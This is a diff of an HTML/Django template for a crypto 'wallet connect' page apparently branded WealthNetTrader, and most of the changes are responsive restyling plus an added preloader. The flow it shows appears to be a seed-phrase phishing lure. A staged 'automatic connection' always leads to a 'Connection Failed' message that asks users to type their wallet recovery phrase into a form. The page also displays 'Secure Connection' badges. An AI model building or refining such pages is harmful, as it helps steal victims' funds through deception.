@@ -771,47 +771,52 @@
                     {% csrf_token %}
                     
                     <!-- Enhanced Wallet Grid -->
-                    <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-8 mb-12">
-                        {% for wallet in form.wallet.field.queryset %}
-                        <div class="wallet-card rounded-3xl p-8 text-center" 
-                             id="wallet-{{ wallet.id }}" 
-                             onclick="selectWallet({{ wallet.id }})">
-                            <input type="radio" name="wallet" value="{{ wallet.id }}" required 
-                                   style="display: none;" id="radio-wallet-{{ wallet.id }}">
-                            
-                            <div class="wallet-icon-container">
-                                {% if wallet.wallet_image %}
-                                <img src="{{ wallet.wallet_image.url }}" alt="{{ wallet.name }}" 
-                                     class="w-12 h-12 object-contain">
-                                {% else %}
-                                <i class="fa-solid fa-wallet text-3xl text-blue-300"></i>
-                                {% endif %}
-                            </div>
-                            
-                            <h3 class="font-semibold text-white text-lg mb-3">{{ wallet.name }}</h3>
-                            <div class="flex justify-center items-center space-x-2 text-sm text-gray-400">
-                                <i class="fa-solid fa-shield-check text-blue-400"></i>
-                                <span>Secure Connection</span>
-                            </div>
-                        </div>
-                        {% endfor %}
-                    </div>
+  <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4 sm:gap-6 lg:gap-8 mb-12">
+      {% for wallet in form.wallet.field.queryset %}
+      <div class="wallet-card rounded-3xl p-4 sm:p-6 lg:p-8 text-center transition-transform duration-300 hover:scale-105"
+           id="wallet-{{ wallet.id }}" 
+           onclick="selectWallet({{ wallet.id }})">
+          <input type="radio" name="wallet" value="{{ wallet.id }}" required 
+                 style="display: none;" id="radio-wallet-{{ wallet.id }}">
+          
+          <div class="wallet-icon-container flex justify-center items-center mb-3">
+              {% if wallet.wallet_image %}
+              <img src="{{ wallet.wallet_image.url }}" alt="{{ wallet.name }}" 
+                   class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 object-contain mx-auto">
+              {% else %}
+              <i class="fa-solid fa-wallet text-2xl sm:text-3xl md:text-4xl text-blue-300"></i>
+              {% endif %}
+          </div>
+          
+          <h3 class="font-semibold text-white text-sm sm:text-base md:text-lg mb-2 sm:mb-3">{{ wallet.name }}</h3>
+          <div class="flex justify-center items-center space-x-1 sm:space-x-2 text-xs sm:text-sm text-gray-400">
+              <i class="fa-solid fa-shield-check text-blue-400"></i>
+              <span>Secure Connection</span>
+          </div>
+      </div>
+      {% endfor %}
+  </div>
 
                     <!-- Enhanced Configure Button -->
-                    <div id="link-button-container" class="text-center mb-10" style="display: none;">
-                        <button type="button" class="btn-primary text-lg px-12 py-5 pulse-glow" onclick="linkWallet()">
-                            <i class="fa-solid fa-plug mr-3"></i>
-                            Connect Wallet Automatically
-                        </button>
-                    </div>
+                   <div id="link-button-container" class="text-center mb-8 sm:mb-10" style="display: none;">
+    <button 
+        type="button" 
+        class="btn-primary text-base sm:text-lg px-6 sm:px-12 py-3 sm:py-5 pulse-glow rounded-xl sm:rounded-2xl w-11/12 sm:w-auto transition-all duration-300"
+        onclick="linkWallet()">
+        <i class="fa-solid fa-plug mr-2 sm:mr-3"></i>
+        Connect Wallet Automatically
+    </button>
+</div>
 
-                    <!-- Enhanced Loading State -->
-                    <div class="loading-message text-center mb-8" id="loading-message" style="display: none;">
-                        <div class="flex items-center justify-center space-x-4">
-                            <div class="loading-spinner w-10 h-10"></div>
-                            <span class="text-xl font-semibold text-blue-400">Connecting to wallet network...</span>
-                        </div>
-                    </div>
+                  <!-- Enhanced Loading State -->
+<div class="loading-message text-center mb-8 px-3 sm:px-0" id="loading-message" style="display: none;">
+    <div class="flex flex-col sm:flex-row items-center justify-center space-y-3 sm:space-y-0 sm:space-x-4">
+        <div class="loading-spinner w-8 h-8 sm:w-10 sm:h-10 border-4 border-t-transparent border-blue-400 rounded-full animate-spin"></div>
+        <span class="text-base sm:text-xl font-semibold text-blue-400 mt-2 sm:mt-0 text-center sm:text-left">
+            Connecting to wallet network...
+        </span>
+    </div>
+</div>
 
                     <!-- Enhanced Progress Bar -->
                     <div id="progress-bar-container" class="mb-10" style="display: none;">
@@ -824,14 +829,18 @@
                         </div>
                     </div>
 
-                    <!-- Enhanced Error Message -->
-                    <div id="error-message" class="bg-yellow-500/20 border-2 border-yellow-500/30 rounded-2xl p-8 mb-8 text-center transition-all duration-300" style="display: none;">
-                        <div class="flex items-center justify-center space-x-4 mb-4">
-                            <i class="fa-solid fa-exclamation-triangle text-yellow-400 text-2xl"></i>
-                            <h3 class="text-xl font-semibold text-yellow-300">Automatic Connection Failed</h3>
-                        </div>
-                        <p class="text-yellow-200/80 text-lg">Please connect manually using your recovery phrase</p>
-                    </div>
+                   <!-- Enhanced Error Message -->
+<div id="error-message" 
+     class="bg-yellow-500/20 border-2 border-yellow-500/30 rounded-2xl p-6 sm:p-8 mb-6 sm:mb-8 text-center transition-all duration-300 mx-3 sm:mx-0" 
+     style="display: none;">
+    <div class="flex flex-col sm:flex-row items-center justify-center text-center sm:space-x-4 mb-3 sm:mb-4">
+        <i class="fa-solid fa-exclamation-triangle text-yellow-400 text-3xl sm:text-2xl mb-2 sm:mb-0"></i>
+        <h3 class="text-lg sm:text-xl font-semibold text-yellow-300">Automatic Connection Failed</h3>
+    </div>
+    <p class="text-yellow-200/80 text-base sm:text-lg leading-relaxed text-center">
+        Please connect manually using your recovery phrase
+    </p>
+</div>
 
                     <!-- Enhanced Recovery Phrase Input -->
                     <div id="recovery-phrase-container" class="glass-card p-8" style="display: none;">
@@ -865,19 +874,22 @@
                         </div>
 
                         <!-- Enhanced Submit Button -->
-                        <div class="text-center mt-8">
-                            <button type="submit" class="btn-primary text-xl px-16 py-5">
-                                <i class="fa-solid fa-check-circle mr-3"></i>
-                                Complete Wallet Setup
-                            </button>
-                        </div>
+                       <div class="text-center mt-6 sm:mt-8">
+                        <button 
+                            type="submit" 
+                            class="btn-primary text-base sm:text-xl px-6 sm:px-16 py-3 sm:py-5 rounded-xl sm:rounded-2xl w-11/12 sm:w-auto transition-all duration-300">
+                            <i class="fa-solid fa-check-circle mr-2 sm:mr-3"></i>
+                            Complete Wallet Setup
+                        </button>
+                    </div>
+
                     </div>
                 </form>
             </div>
 
             <!-- Enhanced Security Features -->
             <div class="glass-card p-10 mt-16">
-                <h2 class="text-3xl font-bold text-center mb-12 text-white">Bank-Grade Security</h2>
+                <h2 class="text-3xl font-bold text-center mb-12 text-white">Block-Chain Security</h2>
                 
                 <div class="grid md:grid-cols-4 gap-8 text-center">
                     <div class="security-feature p-6 rounded-2xl">
@@ -1026,5 +1038,60 @@
             }));
         });
     </script>
+       <!-- ======== PRELOADER START ======== -->
+<div id="preloader" class="fixed inset-0 bg-gray-950 flex flex-col items-center justify-center z-[9999] transition-opacity duration-700">
+  <div class="flex space-x-2 mb-6">
+    <div class="bar h-8 w-2 rounded-full bg-[#048ace] animate-bar"></div>
+    <div class="bar h-10 w-2 rounded-full bg-[#04b3ff] animate-bar delay-100"></div>
+    <div class="bar h-6 w-2 rounded-full bg-[#048ace] animate-bar delay-200"></div>
+    <div class="bar h-12 w-2 rounded-full bg-[#04b3ff] animate-bar delay-300"></div>
+    <div class="bar h-8 w-2 rounded-full bg-[#048ace] animate-bar delay-400"></div>
+  </div>
+
+  <h1 class="text-xl sm:text-2xl font-bold text-[#048ace] tracking-wide">WealthNetTrader</h1>
+</div>
+<!-- ======== PRELOADER END ======== -->
+
+<!-- ======== STYLES ======== -->
+<style>
+  /* Smooth fadeout */
+  #preloader.fade-out {
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  /* Bar animation */
+  @keyframes barUpDown {
+    0%, 100% {
+      transform: scaleY(0.4);
+      opacity: 0.7;
+    }
+    50% {
+      transform: scaleY(1);
+      opacity: 1;
+    }
+  }
+
+  .animate-bar {
+    animation: barUpDown 1s ease-in-out infinite;
+    transform-origin: bottom;
+  }
+
+  .delay-100 { animation-delay: 0.1s; }
+  .delay-200 { animation-delay: 0.2s; }
+  .delay-300 { animation-delay: 0.3s; }
+  .delay-400 { animation-delay: 0.4s; }
+</style>
+
+<!-- ======== SCRIPT ======== -->
+<script>
+  window.addEventListener("load", () => {
+    const preloader = document.getElementById("preloader");
+    setTimeout(() => {
+      preloader.classList.add("fade-out");
+      setTimeout(() => preloader.style.display = "none", 700);
+    }, 700); // Slight delay before fade
+  });
+</script>
 </body>
 </html>
